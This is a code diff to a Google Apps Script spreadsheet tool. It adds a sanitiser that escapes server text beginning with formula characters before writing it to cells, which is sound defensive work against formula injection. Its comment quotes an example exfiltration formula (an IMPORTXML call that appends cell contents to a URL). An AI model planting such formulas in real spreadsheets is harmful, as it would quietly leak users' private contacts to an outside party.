@@ -483,6 +483,33 @@ function applyClosedRowFade_(sheet, closedCol, maxRows, lastCol, first) {
   sheet.setConditionalFormatRules(rules);
 }
 
+/**
+ * Server text, made safe to put in a cell.
+ *
+ * **A cell whose value begins with `=` is a live formula**, so any string the
+ * server sends could execute inside the student's own spreadsheet. The concrete
+ * danger is exfiltration, not defacement: `=IMPORTXML("https://…"&A2)` would
+ * quietly send the contents of their tracker to whoever asked for it — and it
+ * would run in *their* account, under *their* permissions, against contacts
+ * Blotter has spent its whole design never storing.
+ *
+ * Only Blotter's own server sends these strings, so this is not an attack
+ * anyone can mount today. It is the difference between "the server was
+ * compromised" and "every student's contact list was compromised", and it costs
+ * one function to remove.
+ *
+ * A leading apostrophe is Sheets' own way of saying "this is text". It does not
+ * appear in the cell.
+ *
+ * Applied to everything the server can put on a sheet: the banner, the Found
+ * name, email and context, and the warnings line.
+ */
+function safeCell_(value) {
+  if (value === null || value === undefined) return '';
+  var text = String(value);
+  return /^[=+\-@\t\r]/.test(text) ? "'" + text : text;
+}
+
 /** A1 column letter for a 1-based index. Sheets has no built-in for this. */
 function columnLetter_(index) {
   var letter = '';
@@ -1311,7 +1338,7 @@ function writeBanner_(sheet, notice, restingText) {
   var dress = function (range, value, bold) {
     range.breakApart();
     range.merge();
-    range.setValue(value)
+    range.setValue(safeCell_(value))
       .setFontFamily('Arial')
       .setFontSize(11)
       .setFontWeight(bold ? 'bold' : 'normal')
@@ -1629,7 +1656,8 @@ function courierPass_() {
     var addressWarnings = unreadableAddressWarnings_(sheetState.unreadableAddresses);
     var warningLines = addressWarnings.concat(response.warnings || []);
     if (pretendWarning) warningLines.unshift(pretendWarning);
-    writeSetting_(ss, SETTING_WARNINGS, warningLines.length ? warningLines.join(' | ') : 'None');
+    writeSetting_(ss, SETTING_WARNINGS,
+      warningLines.length ? safeCell_(warningLines.join(' | ')) : 'None');
 
     // The measurement (13-BRIEF-COURIER-2 §2): what a run actually costs.
     var seconds = Math.round((new Date().getTime() - runMetrics_.startedMs) / 1000);
@@ -2351,7 +2379,8 @@ function writeFoundSuggestions_(ss, sheetState, foundState, found) {
     var key = String(f.email || '').toLowerCase();
     if (key === '' || sheetState.emailsInSheet[key] || foundState.emailsInFound[key]) return;
     foundState.emailsInFound[key] = true;
-    rows.push(['', f.name || '', f.email, f.first_seen || '', f.context || '']);
+    rows.push(['', safeCell_(f.name || ''), safeCell_(f.email),
+               safeCell_(f.first_seen || ''), safeCell_(f.context || '')]);
   });
   if (rows.length > 0) {
     var sheet = foundState.sheet;
